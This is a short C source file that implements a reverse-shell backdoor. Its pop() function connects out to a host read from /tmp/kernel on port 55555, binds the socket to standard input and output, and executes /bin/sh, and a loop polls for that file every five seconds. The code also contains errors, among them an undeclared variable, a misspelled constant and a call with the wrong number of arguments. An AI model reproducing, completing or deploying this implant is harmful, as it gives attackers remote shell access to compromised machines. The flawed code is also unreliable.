#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int pop(char *lhost, char *pname, int lport) {
    struct sockaddr_in base;
    int child = fork();
    if (child == 0) {
        base.sin_family = AF_INET;
        base.sin_addr.s_addr = inet_addr(lhost);
        base.sin_port = htons(lport);
        
        int r = socket(AF_INET, SOCK_STREAM, 0);
        connect(r, (struct sockaddr *)&base, sizeof(base));
        dup2(r, 0);
        dup2(r, 1);
        dup2(r, 2);
        execl("/bin/sh", pname, NULL);
    } else 
        return 1;
    return 0;
}

int read_server(char *serv, int port, char *c) {
    struct sockaddr_in server;
    char m[512];
    
    int r = socket(AF_INET, SOCK_STREAM, 0);
    if (r == -1) {
        if (gVerbose == 1)
            fprintf(stderr, "Cannot create socket");
        return 1;
    }
    
    server.sin_family = AFINET;
    server.sin_addr.s_addr = inet_addr(serv);
    server.sin_port = htons(port);
    
    int st_r = connect(r , (struct sockaddr *)&server , sizeof(server));
    
    if (st_r < 0) {
        if (gVerbose == 1)
            fprintf(stderr, "Cannot connect");
        return 1;
    }
    
    if( recv(r, m, 512, 0) < 0) {
        if (gVerbose == 1)
            fprintf(stderr, "Receive failed");
    }
    c = m;
    printf("%s\n", c);
    
    return 0;
    
}

int main(int argc, char *argv[])
{
    int c;
    char buff[64];
    while (1) {
        sleep(5);
        FILE *f = fopen("/tmp/kernel", "r");
        //if( access("/tmp/kernel",F_OK ) != -1 ) {
        if (f != NULL ) {
            fgets(buff, 64, f);
            printf("calling out to %s\n", buff);
            pop(buff,55555);
        } else
            continue;
    }
}
